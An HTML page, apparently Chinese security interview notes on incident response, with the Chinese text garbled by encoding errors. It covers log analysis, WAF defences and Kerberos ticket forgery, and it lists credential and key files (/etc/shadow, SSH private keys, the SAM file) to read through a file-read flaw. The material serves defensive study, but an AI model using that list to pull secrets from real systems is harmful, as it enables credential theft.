<h3 id="æŒ–çŸ¿ç—…æ¯’åˆ¤æ–­-amp-æŒ–çŸ¿å¸¸è§æ‰‹æ®µ-amp-å¤„ç†"><a href="#æŒ–çŸ¿ç—…æ¯’åˆ¤æ–­-amp-æŒ–çŸ¿å¸¸è§æ‰‹æ®µ-amp-å¤„ç†" class="headerlink" title="æŒ–çŸ¿ç—…æ¯’åˆ¤æ–­&amp;æŒ–çŸ¿å¸¸è§æ‰‹æ®µ&amp;å¤„ç†"></a>æŒ–çŸ¿ç—…æ¯’åˆ¤æ–­&amp;æŒ–çŸ¿å¸¸è§æ‰‹æ®µ&amp;å¤„ç†</h3><p>  æ€ä¹ˆå‘ç°æœ‰æ²¡æœ‰è¢«æ”»å‡»ï¼Œ<br>    æ”»å‡»åˆ¤æ–­å¯ä»¥å»ºç«‹åœ¨è®¾å¤‡çš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨è®¾å¤‡çš„å‘Šè­¦ï¼Œ<br>    å¦‚æœæ²¡ç”¨è®¾å¤‡çš„è¯å¯è€ƒè™‘å¦‚ä¸‹<br>      ç½‘ç«™è¢«æ”»å‡»:<br>        ç½‘ç«™é¦–é¡µè¢«ç¯¡æ”¹ ç½‘ç«™è·³è½¬åˆ°åˆ«çš„ç½‘ç«™ è¢«æ¤å…¥webshell DDOS\CCæ”»å‡»<br>      æœåŠ¡å™¨è¢«é»‘:<br>        æœåŠ¡å™¨ä¸­æœ¨é©¬ç—…æ¯’ æœåŠ¡å™¨ç®¡ç†å‘˜è´¦æˆ·å¯†ç è¢«æ”¹ æœåŠ¡å™¨è¢«è¿œæ§ æœåŠ¡å™¨è¢«æµé‡æ”»å‡»</p>
<h3 id="æ•°æ®åŒ…æˆ–è€…æ—¥å¿—ï¼Œä½ çš„åˆ†ææ€è·¯æ˜¯ä»€ä¹ˆ"><a href="#æ•°æ®åŒ…æˆ–è€…æ—¥å¿—ï¼Œä½ çš„åˆ†ææ€è·¯æ˜¯ä»€ä¹ˆ" class="headerlink" title="æ•°æ®åŒ…æˆ–è€…æ—¥å¿—ï¼Œä½ çš„åˆ†ææ€è·¯æ˜¯ä»€ä¹ˆ"></a>æ•°æ®åŒ…æˆ–è€…æ—¥å¿—ï¼Œä½ çš„åˆ†ææ€è·¯æ˜¯ä»€ä¹ˆ</h3><p>  åˆ†ææŠ¥æ–‡ä¸­çš„host å’Œ ç½‘ç«™ç›®å½•è·¯å¾„æ˜¯å¦å¯ç–‘<br>  é€šè¿‡å¨èƒå¹³å°åˆ†æhost æ˜¯å¦ä¸ºæ¶æ„IP<br>  ä½¿ç”¨wireshark å¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†æ<br>  å·¥å…· wireshark<br>  ç½‘ç«™ å¾®æ­¥åœ¨çº¿ç­‰å¨èƒæƒ…æŠ¥å¹³å°</p>
<h3 id="æ–‡ä»¶ä¸Šä¼ å’Œå‘½ä»¤æ‰§è¡Œï¼Œæœ‰çœ‹è¿‡ç›¸å…³æ—¥å¿—å—"><a href="#æ–‡ä»¶ä¸Šä¼ å’Œå‘½ä»¤æ‰§è¡Œï¼Œæœ‰çœ‹è¿‡ç›¸å…³æ—¥å¿—å—" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å’Œå‘½ä»¤æ‰§è¡Œï¼Œæœ‰çœ‹è¿‡ç›¸å…³æ—¥å¿—å—"></a>æ–‡ä»¶ä¸Šä¼ å’Œå‘½ä»¤æ‰§è¡Œï¼Œæœ‰çœ‹è¿‡ç›¸å…³æ—¥å¿—å—</h3><p>  ç³»ç»Ÿæ—¥å¿—  çœ‹æœ‰æ²¡æœ‰webå®¹å™¨åšäº†å±é™©è¡Œä¸º åå¼¹shellä¹‹ç±»<br>  ç½‘ç»œåº”ç”¨æ—¥å¿—  æŸ¥æ‰¾å¼‚å¸¸ç½‘ç«™æ–‡ä»¶ webshell</p>
<h3 id="windowsæ—¥å¿—åˆ†æå·¥å…·"><a href="#windowsæ—¥å¿—åˆ†æå·¥å…·" class="headerlink" title="windowsæ—¥å¿—åˆ†æå·¥å…·"></a>windowsæ—¥å¿—åˆ†æå·¥å…·</h3><p>  Log Parser ã€ LOgParse Lizardã€Event Log Explorer</p>
<h3 id="Linuxæ—¥å¿—åˆ†ææŠ€å·§å‘½ä»¤"><a href="#Linuxæ—¥å¿—åˆ†ææŠ€å·§å‘½ä»¤" class="headerlink" title="Linuxæ—¥å¿—åˆ†ææŠ€å·§å‘½ä»¤"></a>Linuxæ—¥å¿—åˆ†ææŠ€å·§å‘½ä»¤</h3><p>  grep/awk/sortç­‰å‘½ä»¤é…åˆä½¿ç”¨</p>
<h3 id="ç»™ä½ ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ—¥å¿—ï¼Œåº”è¯¥å¦‚ä½•åˆ†æ"><a href="#ç»™ä½ ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ—¥å¿—ï¼Œåº”è¯¥å¦‚ä½•åˆ†æ" class="headerlink" title="ç»™ä½ ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ—¥å¿—ï¼Œåº”è¯¥å¦‚ä½•åˆ†æ"></a>ç»™ä½ ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ—¥å¿—ï¼Œåº”è¯¥å¦‚ä½•åˆ†æ</h3><p>  æ—¶é—´æ—¥æœŸã€url ã€çŠ¶æ€ç ã€UA ç¼©å°èŒƒå›´  ç„¶åå†å»ç”¨å·¥å…·</p>
<h3 id="Windowsåœ¨åº”æ€¥å“åº”ä¸­çš„å®‰å…¨æ—¥å¿—ä»¥åŠå¯¹åº”åœºæ™¯"><a href="#Windowsåœ¨åº”æ€¥å“åº”ä¸­çš„å®‰å…¨æ—¥å¿—ä»¥åŠå¯¹åº”åœºæ™¯" class="headerlink" title="Windowsåœ¨åº”æ€¥å“åº”ä¸­çš„å®‰å…¨æ—¥å¿—ä»¥åŠå¯¹åº”åœºæ™¯"></a>Windowsåœ¨åº”æ€¥å“åº”ä¸­çš„å®‰å…¨æ—¥å¿—ä»¥åŠå¯¹åº”åœºæ™¯</h3><h3 id="è®¾å¤‡è¯¯æŠ¥å¦‚ä½•å¤„ç†"><a href="#è®¾å¤‡è¯¯æŠ¥å¦‚ä½•å¤„ç†" class="headerlink" title="è®¾å¤‡è¯¯æŠ¥å¦‚ä½•å¤„ç†"></a>è®¾å¤‡è¯¯æŠ¥å¦‚ä½•å¤„ç†</h3><h3 id="Windowså’ŒLinuxçš„æ—¥å¿—æ–‡ä»¶æ”¾åœ¨å“ªé‡Œ"><a href="#Windowså’ŒLinuxçš„æ—¥å¿—æ–‡ä»¶æ”¾åœ¨å“ªé‡Œ" class="headerlink" title="Windowså’ŒLinuxçš„æ—¥å¿—æ–‡ä»¶æ”¾åœ¨å“ªé‡Œ"></a>Windowså’ŒLinuxçš„æ—¥å¿—æ–‡ä»¶æ”¾åœ¨å“ªé‡Œ</h3><p>  Windows ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç±»æ—¥å¿—è®°å½•ç³»ç»Ÿäº‹ä»¶ï¼šåº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—å’Œå®‰å…¨æ—¥å¿—<br>    ç³»ç»Ÿæ—¥å¿—ï¼š<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code><br>    åº”ç”¨ç¨‹åºæ—¥å¿—ï¼š<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code><br>    å®‰å…¨æ—¥å¿—ï¼š<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code><br>  Linux<br>    æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<code>/var/log/</code><br>    æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼š<code>more /etc/rsyslog.conf</code></p>
<p> å¸¸è§ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶è·¯å¾„</p>
<p>  <code>apacheï¼š/etc/httpd/conf</code><br>  <code>nginxï¼š/etc/nginx</code><br>  <code>iis7ï¼šC:\Windows\System32\inetsrv\config\</code></p>
<h3 id="å¦‚ä½•æŸ¥çœ‹ç³»ç»Ÿå†…å­˜shell"><a href="#å¦‚ä½•æŸ¥çœ‹ç³»ç»Ÿå†…å­˜shell" class="headerlink" title="å¦‚ä½•æŸ¥çœ‹ç³»ç»Ÿå†…å­˜shell"></a>å¦‚ä½•æŸ¥çœ‹ç³»ç»Ÿå†…å­˜shell</h3><h3 id="Java-å†…å­˜é©¬æ’æŸ¥"><a href="#Java-å†…å­˜é©¬æ’æŸ¥" class="headerlink" title="Java å†…å­˜é©¬æ’æŸ¥"></a>Java å†…å­˜é©¬æ’æŸ¥</h3><h3 id="å¦‚ä½•ä¿®æ”¹WEBç«¯å£ï¼Ÿå¦‚æœä¸èƒ½ä¿®æ”¹ç«¯å£è¿˜æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹æ³•ï¼Ÿ"><a href="#å¦‚ä½•ä¿®æ”¹WEBç«¯å£ï¼Ÿå¦‚æœä¸èƒ½ä¿®æ”¹ç«¯å£è¿˜æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹æ³•ï¼Ÿ" class="headerlink" title="å¦‚ä½•ä¿®æ”¹WEBç«¯å£ï¼Ÿå¦‚æœä¸èƒ½ä¿®æ”¹ç«¯å£è¿˜æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹æ³•ï¼Ÿ"></a>å¦‚ä½•ä¿®æ”¹WEBç«¯å£ï¼Ÿå¦‚æœä¸èƒ½ä¿®æ”¹ç«¯å£è¿˜æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹æ³•ï¼Ÿ</h3><h3 id="è·å¾—æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé€šå¸¸ä¼šè¯»å“ªäº›æ–‡ä»¶ï¼ŒLinuxå’Œwindowséƒ½è°ˆè°ˆ"><a href="#è·å¾—æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé€šå¸¸ä¼šè¯»å“ªäº›æ–‡ä»¶ï¼ŒLinuxå’Œwindowséƒ½è°ˆè°ˆ" class="headerlink" title="è·å¾—æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé€šå¸¸ä¼šè¯»å“ªäº›æ–‡ä»¶ï¼ŒLinuxå’Œwindowséƒ½è°ˆè°ˆ"></a>è·å¾—æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé€šå¸¸ä¼šè¯»å“ªäº›æ–‡ä»¶ï¼ŒLinuxå’Œwindowséƒ½è°ˆè°ˆ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windowsï¼š</span><br><span class="line">  C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line">  C:\Windows\System32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶</span><br><span class="line">  C:\Windows\repair\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line">  C:\Program Files\mysql\my.ini //Mysqlé…ç½®</span><br><span class="line">  C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">  C:\Windows\php.ini //phpé…ç½®ä¿¡æ¯</span><br><span class="line">  C:\Windows\my.ini //Mysqlé…ç½®ä¿¡æ¯</span><br><span class="line">  C:\Windows\win.ini //Windowsç³»ç»Ÿçš„ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linuxï¼š</span><br><span class="line">  /root/.ssh/authorized_keys</span><br><span class="line">  /root/.ssh/id_rsa</span><br><span class="line">  /root/.ssh/id_ras.keystore</span><br><span class="line">  /root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥</span><br><span class="line">  /etc/passwd</span><br><span class="line">  /etc/shadow</span><br><span class="line">  /etc/my.cnf //mysqlé…ç½®æ–‡ä»¶</span><br><span class="line">  /etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶</span><br><span class="line">  /root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶</span><br><span class="line">  /root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶</span><br><span class="line">  /proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡</span><br><span class="line">  /porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶</span><br><span class="line">  /var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„</span><br><span class="line">  /porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°</span><br></pre></td></tr></table></figure>

<h3 id="windowsç«¯å£è¿›ç¨‹é—´è½¬æ¢"><a href="#windowsç«¯å£è¿›ç¨‹é—´è½¬æ¢" class="headerlink" title="windowsç«¯å£è¿›ç¨‹é—´è½¬æ¢"></a>windowsç«¯å£è¿›ç¨‹é—´è½¬æ¢</h3><p>  netstat -ano | findstr â€œportâ€æŸ¥çœ‹ç›®å‰çš„ç½‘ç»œè¿æ¥ï¼Œå®šä½å¯ç–‘çš„ ESTABLISHED<br>  æ ¹æ®netstatå®šä½å‡ºçš„ pidï¼Œå†é€šè¿‡tasklistå‘½ä»¤è¿›è¡Œè¿›ç¨‹å®šä½tasklist | findstr â€œPIDâ€</p>
<h3 id="æ–‡ä»¶ä¸Šä¼ æ”»å‡»ç‰¹å¾ï¼Ÿ"><a href="#æ–‡ä»¶ä¸Šä¼ æ”»å‡»ç‰¹å¾ï¼Ÿ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ”»å‡»ç‰¹å¾ï¼Ÿ"></a>æ–‡ä»¶ä¸Šä¼ æ”»å‡»ç‰¹å¾ï¼Ÿ</h3><p>  ä¸Šä¼ æ–‡ä»¶çš„æ¥å£  å¯¹ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ç±»å‹æ ¡éªŒä¸ä¸¥æ ¼</p>
<h3 id="æ–‡ä»¶ä¸Šä¼ åŠ å›ºæ–¹æ³•ï¼Ÿ"><a href="#æ–‡ä»¶ä¸Šä¼ åŠ å›ºæ–¹æ³•ï¼Ÿ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ åŠ å›ºæ–¹æ³•ï¼Ÿ"></a>æ–‡ä»¶ä¸Šä¼ åŠ å›ºæ–¹æ³•ï¼Ÿ</h3><p>  åç«¯é™åˆ¶æ–‡ä»¶ä¸Šä¼ ç™½åå•ï¼Œå¤´åƒä¸å…è®¸ä¸Šä¼  svg<br>  ä¸Šä¼ åæ–‡ä»¶éšæœºé‡å‘½åï¼Œä¸è¦è¾“å‡ºä¿å­˜æ–‡ä»¶ä½ç½®<br>  å›¾ç‰‡æ–‡ä»¶å¯ä»¥äºŒæ¬¡æ¸²æŸ“ï¼Œä½¿ç”¨å¯¹è±¡å­˜å‚¨ oss<br>  æ–‡ä»¶ç›®å½•å–æ¶ˆæ‰§è¡Œæƒé™ï¼ŒPHP è®¾ç½® basedir</p>
<h3 id="ä½ è¿˜ç”¨è¿‡å…¶ä»–æ€åŠ¿æ„ŸçŸ¥çš„äº§å“å—ï¼Ÿ"><a href="#ä½ è¿˜ç”¨è¿‡å…¶ä»–æ€åŠ¿æ„ŸçŸ¥çš„äº§å“å—ï¼Ÿ" class="headerlink" title="ä½ è¿˜ç”¨è¿‡å…¶ä»–æ€åŠ¿æ„ŸçŸ¥çš„äº§å“å—ï¼Ÿ"></a>ä½ è¿˜ç”¨è¿‡å…¶ä»–æ€åŠ¿æ„ŸçŸ¥çš„äº§å“å—ï¼Ÿ</h3><p>  ipsï¼Œidsï¼Œhidsï¼Œå ¡å’æœº</p>
<h3 id="é’“é±¼é‚®ä»¶å¤„ç½®"><a href="#é’“é±¼é‚®ä»¶å¤„ç½®" class="headerlink" title="é’“é±¼é‚®ä»¶å¤„ç½®"></a>é’“é±¼é‚®ä»¶å¤„ç½®</h3><p>  å±è”½åŠå…¬åŒºåŸŸå¯¹é’“é±¼é‚®ä»¶å†…å®¹æ¶‰åŠç«™ç‚¹ã€URL è®¿é—®<br>  æ ¹æ®åŠå…¬ç¯å¢ƒå®é™…æƒ…å†µå¯ä»¥åœ¨ä¸Šç½‘è¡Œä¸ºç®¡ç†ã€è·¯ç”±å™¨ã€äº¤æ¢æœºä¸Šè¿›è¡Œå±è”½<br>  å¯¹è®¿é—®é’“é±¼ç½‘ç«™çš„å†…ç½‘ IP è¿›è¡Œè®°å½•ï¼Œä»¥ä¾¿åç»­æ’æŸ¥æº¯æºå¯èƒ½çš„åæœ<br>  æ ¹æ®é’“é±¼é‚®ä»¶å‘ä»¶äººè¿›è¡Œæ—¥å¿—å›æº¯</p>
<h3 id="å¦‚ä½•æŸ¥çœ‹åŒºåˆ†æ˜¯æ‰«ææµé‡å’Œæ‰‹åŠ¨æµé‡"><a href="#å¦‚ä½•æŸ¥çœ‹åŒºåˆ†æ˜¯æ‰«ææµé‡å’Œæ‰‹åŠ¨æµé‡" class="headerlink" title="å¦‚ä½•æŸ¥çœ‹åŒºåˆ†æ˜¯æ‰«ææµé‡å’Œæ‰‹åŠ¨æµé‡"></a>å¦‚ä½•æŸ¥çœ‹åŒºåˆ†æ˜¯æ‰«ææµé‡å’Œæ‰‹åŠ¨æµé‡</h3><p>  æ‰«ææ•°æ®é‡å¤§ï¼Œè¯·æ±‚æœ‰è§„å¾‹ï¼Œæ‰‹åŠ¨æ‰«æé—´éš”è¾ƒå°‘</p>
<h3 id="ï¸å…¥ä¾µæ£€æµ‹-amp-é˜²å¾¡"><a href="#ï¸å…¥ä¾µæ£€æµ‹-amp-é˜²å¾¡" class="headerlink" title="ï¸å…¥ä¾µæ£€æµ‹&amp;é˜²å¾¡"></a>ï¸å…¥ä¾µæ£€æµ‹&amp;é˜²å¾¡</h3><h3 id="WAFäº§å“å¦‚ä½•æ¥æ‹¦æˆªæ”»å‡»ï¼Ÿ"><a href="#WAFäº§å“å¦‚ä½•æ¥æ‹¦æˆªæ”»å‡»ï¼Ÿ" class="headerlink" title="WAFäº§å“å¦‚ä½•æ¥æ‹¦æˆªæ”»å‡»ï¼Ÿ"></a>WAFäº§å“å¦‚ä½•æ¥æ‹¦æˆªæ”»å‡»ï¼Ÿ</h3><p>  äº‘ Waf<br>  Web é˜²æŠ¤è½¯ä»¶<br>  ç¡¬ä»¶ Web é˜²ç«å¢™</p>
<h3 id="WAFæœ‰å“ªäº›é˜²æŠ¤æ–¹å¼ï¼Ÿ"><a href="#WAFæœ‰å“ªäº›é˜²æŠ¤æ–¹å¼ï¼Ÿ" class="headerlink" title="WAFæœ‰å“ªäº›é˜²æŠ¤æ–¹å¼ï¼Ÿ"></a>WAFæœ‰å“ªäº›é˜²æŠ¤æ–¹å¼ï¼Ÿ</h3><p>  WebåŸºç¡€é˜²æŠ¤<br>    å¯é˜²èŒƒå¸¸è§„çš„ web åº”ç”¨æ”»å‡»ï¼Œå¦‚ SQL æ³¨å…¥æ”»å‡»ã€XSS è·¨ç«™æ”»å‡»ç­‰ï¼Œå¯æ£€æµ‹ webshellï¼Œæ£€æŸ¥ HTTP ä¸Šä¼ é€šé“ä¸­çš„ç½‘é¡µæœ¨é©¬ï¼Œæ‰“å¼€å¼€å…³å³å®æ—¶ç”Ÿæ•ˆ<br>  CC æ”»å‡»é˜²æŠ¤<br>    å¯æ ¹æ® IPã€Cookie æˆ–è€… Referer å­—æ®µåè®¾ç½®çµæ´»çš„é™é€Ÿç­–ç•¥ï¼Œæœ‰æ•ˆç¼“è§£ CC æ”»å‡»<br>  ç²¾å‡†è®¿é—®é˜²æŠ¤<br>    å¯¹å¸¸è§ HTTP å­—æ®µè¿›è¡Œæ¡ä»¶ç»„åˆï¼Œ æ”¯æŒå®šåˆ¶åŒ–é˜²æŠ¤ç­–ç•¥å¦‚CSRFé˜²æŠ¤ï¼Œé€šè¿‡è‡ªå®šä¹‰è§„åˆ™çš„é…ç½®ï¼Œæ›´ç²¾å‡†çš„è¯†åˆ«æ¶æ„ä¼ªé€ è¯·æ±‚ã€ä¿æŠ¤ç½‘ç«™æ•æ„Ÿä¿¡æ¯ã€æé«˜é˜²æŠ¤ç²¾å‡†æ€§<br>  IP é»‘ç™½åå•<br>    æ·»åŠ ç»ˆæ‹¦æˆªä¸å§‹ç»ˆæ”¾è¡Œçš„é»‘ç™½åå• IPï¼Œå¢åŠ é˜²å¾¡å‡†ç¡®æ€§<br>  åœ°ç†ä½ç½®è®¿é—®æ§åˆ¶<br>    æ·»åŠ åœ°ç†ä½ç½®è®¿é—®æ§åˆ¶è§„åˆ™ï¼Œé’ˆå¯¹æ¥æº IP è¿›è¡Œè‡ªå®šä¹‰è®¿é—®æ§åˆ¶<br>  ç½‘é¡µé˜²ç¯¡æ”¹<br>    å¯¹ç½‘ç«™çš„é™æ€ç½‘é¡µè¿›è¡Œç¼“å­˜é…ç½®ï¼Œå½“ç”¨æˆ·è®¿é—®æ—¶è¿”å›ç»™ç”¨æˆ·ç¼“å­˜çš„æ­£å¸¸é¡µé¢ï¼Œå¹¶éšæœºæ£€æµ‹ç½‘é¡µæ˜¯å¦è¢«ç¯¡æ”¹<br>  ç½‘ç«™åçˆ¬è™«<br>    åŠ¨æ€åˆ†æç½‘ç«™ä¸šåŠ¡æ¨¡å‹ï¼Œç»“åˆäººæœºè¯†åˆ«æŠ€æœ¯å’Œæ•°æ®é£æ§æ‰‹æ®µï¼Œç²¾å‡†è¯†åˆ«çˆ¬è™«è¡Œä¸º<br>  è¯¯æŠ¥å±è”½<br>    é’ˆå¯¹ç‰¹å®šè¯·æ±‚å¿½ç•¥æŸäº›æ”»å‡»æ£€æµ‹è§„åˆ™ï¼Œç”¨äºå¤„ç†è¯¯æŠ¥äº‹ä»¶<br>  éšç§å±è”½<br>    éšç§ä¿¡æ¯å±è”½ï¼Œé¿å…ç”¨æˆ·çš„å¯†ç ç­‰ä¿¡æ¯å‡ºç°åœ¨äº‹ä»¶æ—¥å¿—ä¸­<br>  é˜²æ•æ„Ÿä¿¡æ¯æ³„éœ²<br>    é˜²æ­¢åœ¨é¡µé¢ä¸­æ³„éœ²ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šç”¨æˆ·çš„èº«ä»½è¯å·ç ã€æ‰‹æœºå·ç ã€ç”µå­é‚®ç®±ç­‰</p>
<h3 id="ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´å¦‚ä½•åšå‰ç½®è§„é¿ï¼Ÿ"><a href="#ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´å¦‚ä½•åšå‰ç½®è§„é¿ï¼Ÿ" class="headerlink" title="ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´å¦‚ä½•åšå‰ç½®è§„é¿ï¼Ÿ"></a>ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´å¦‚ä½•åšå‰ç½®è§„é¿ï¼Ÿ</h3><h3 id="å¦‚æœç°åœ¨è¦ä½ å†™ä¸€ä¸ªæ£€æµ‹å‘½ä»¤æ³¨å…¥çš„è„šæœ¬ï¼Ÿ"><a href="#å¦‚æœç°åœ¨è¦ä½ å†™ä¸€ä¸ªæ£€æµ‹å‘½ä»¤æ³¨å…¥çš„è„šæœ¬ï¼Ÿ" class="headerlink" title="å¦‚æœç°åœ¨è¦ä½ å†™ä¸€ä¸ªæ£€æµ‹å‘½ä»¤æ³¨å…¥çš„è„šæœ¬ï¼Ÿ"></a>å¦‚æœç°åœ¨è¦ä½ å†™ä¸€ä¸ªæ£€æµ‹å‘½ä»¤æ³¨å…¥çš„è„šæœ¬ï¼Ÿ</h3><h3 id="ï¸æº¯æºåŸºæœ¬æ­¥éª¤"><a href="#ï¸æº¯æºåŸºæœ¬æ­¥éª¤" class="headerlink" title="ï¸æº¯æºåŸºæœ¬æ­¥éª¤"></a>ï¸æº¯æºåŸºæœ¬æ­¥éª¤</h3><p>  &lt;1&gt; æ”»å‡»æºæ•è·<br>    å®‰å…¨è®¾å¤‡æŠ¥è­¦ï¼Œå¦‚æ‰«æIPã€å¨èƒé˜»æ–­ã€ç—…æ¯’æœ¨é©¬ã€å…¥ä¾µäº‹ä»¶ç­‰<br>    æ—¥å¿—ä¸æµé‡åˆ†æï¼Œå¼‚å¸¸çš„é€šè®¯æµé‡ã€æ”»å‡»æºä¸æ”»å‡»ç›®æ ‡ç­‰<br>    æœåŠ¡å™¨èµ„æºå¼‚å¸¸ï¼Œå¼‚å¸¸çš„æ–‡ä»¶ã€è´¦å·ã€è¿›ç¨‹ã€ç«¯å£ï¼Œå¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡å’ŒæœåŠ¡ç­‰<br>    é‚®ä»¶é’“é±¼ï¼Œè·å–æ¶æ„æ–‡ä»¶æ ·æœ¬ã€é’“é±¼ç½‘ç«™ URL ç­‰<br>    èœœç½ç³»ç»Ÿï¼Œè·å–æ”»å‡»è€… IDã€ç”µè„‘ä¿¡æ¯ã€æµè§ˆå™¨æŒ‡çº¹ã€è¡Œä¸ºã€æ„å›¾çš„ç›¸å…³ä¿¡æ¯</p>
<p>  &lt;2&gt; æº¯æºååˆ¶æ‰‹æ®µ</p>
<p>  &lt;3&gt; æ”»å‡»è€…ç”»åƒ</p>
<hr>
<h3 id="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«"><a href="#é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«" class="headerlink" title="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«"></a>é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«</h3><p>1.è®¿é—®æƒé™ä¸åŒ<br>Golden Ticket: ä¼ªé€ TGT,å¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™<br>Silver Ticket: ä¼ªé€ TGS,åªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡<br>2.åŠ å¯†æ–¹å¼ä¸åŒ<br>Golden Ticket ç”±Kerberosçš„Hashâ€”&gt; krbtgtåŠ å¯†<br>Silver Ticket ç”±æœåŠ¡å™¨ç«¯å¯†ç çš„Hashå€¼â€”&gt; master key åŠ å¯†<br>3.è®¤è¯æµç¨‹ä¸åŒ<br>Golden Ticket çš„åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§(KDC)<br>Silver Ticket å¯ä»¥ç›´æ¥è·³è¿‡ KDC ç›´æ¥è®¿é—®å¯¹åº”çš„æœåŠ¡å™¨</p>
<h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŒºåˆ«"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŒºåˆ«" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŒºåˆ«"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŒºåˆ«</h3><p>  åºåˆ—åŒ–: æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦åºåˆ—çš„è¿‡ç¨‹  serialize()<br>  ååºåˆ—åŒ–: æŠŠå­—ç¬¦åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹  unserialize()</p>
<h3 id="å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´ï¼Ÿ"><a href="#å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´ï¼Ÿ" class="headerlink" title="å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´ï¼Ÿ"></a>å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´ï¼Ÿ</h3><p>  IIS       putæ¼æ´ æ–‡ä»¶è§£æ(6.0 /test.asp/test.jpg test.asp;.jpg | 7.5 test.jpg/.php)<br>  Apache    æ–‡ä»¶è§£ææ¼æ´(php.xxx.yyy)  ç›®å½•éå†<br>  Nginx     ç›®å½•éå† æ–‡ä»¶è§£ææ¼æ´(1.png/.php-&gt; php é…ç½®é”™è¯¯) CRLFæ³¨å…¥(\r\n)<br>  Tomcat    waråé—¨éƒ¨ç½² è¿œç¨‹ä»£ç æ‰§è¡Œ<br>  Jboss     ååºåˆ—åŒ– waråé—¨éƒ¨ç½²<br>  Weblogic  ååºåˆ—åŒ– ssrf waråé—¨éƒ¨ç½² ä»»æ„æ–‡ä»¶ä¸Šä¼ </p>
